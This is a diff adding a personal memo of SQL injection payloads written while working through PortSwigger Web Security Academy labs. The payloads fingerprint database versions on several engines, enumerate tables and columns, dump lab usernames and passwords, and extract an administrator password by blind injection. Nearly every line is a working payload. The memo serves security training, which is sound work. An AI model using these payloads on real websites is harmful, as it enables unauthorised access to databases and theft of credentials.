@@ -1,0 +1,59 @@
+# PortSwigger Web Security Academy - SQL Injection Attack memo
+# Get Oracel Version by SQL Injection Attack
+
+Accessories' union select 'abc', 'def' from dual --
+
+Accessories' union select null,null --
+// mysql comments need space after -- 
+Accessories' union select 'abc','def' --+
+Accessories'+union+select+'abc','def'#
+
+
+Accessories' union select version, 'def' from v$instance --
+
+// banner_full and banner_legacy available since Oracle Database Release 18c, version 18.1
+Accessories' union select banner_full, 'def' from v$version --
+
+Accessories' union select banner, 'def' from v$version --
+
+// check sql server
+Accessories' union select @@version, 'def' --+
+
+// check mysql
+Accessories' union select @@version, 'def' --+
+
+// check posgressql
+Accessories' union select version(), 'def' --+
+
+// PostgreSQL Contents
+PostgreSQL	
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+
+Accessories%27%20union%20select%20table_name,%20table_schema%20from%20information_schema.tables--+
+
+Accessories' union select table_name, table_schema from information_schema.tables where table_schema='public' --+
+
+Accessories' union select column_name, data_type from information_schema.columns where table_name='users_kuhiqd' --+
+Accessories' union select column_name, 'def' from information_schema.columns --+
+
+Accessories' union select username_qsizmn, password_xuavek from users_kuhiqd --+
+
+// Oracle Contents
+SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+
+Accessories' union select table_name, tablespace_name from all_tables --+
+
+Accessories' union select table_name, tablespace_name from all_tables where tablespace_name='SYSTEM' --+
+
+Accessories' union select column_name, table_name from all_tab_columns where table_name='PRODUCTS' --+
+
+Accessories' union select column_name, table_name from all_tab_columns where table_name='USERS_VTGQYL' --+
+
+Accessories' union select PASSWORD_DVUKPO, USERNAME_SVFNLT from USERS_VTGQYL --+
+
+
+Blind SQL Injection
+' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
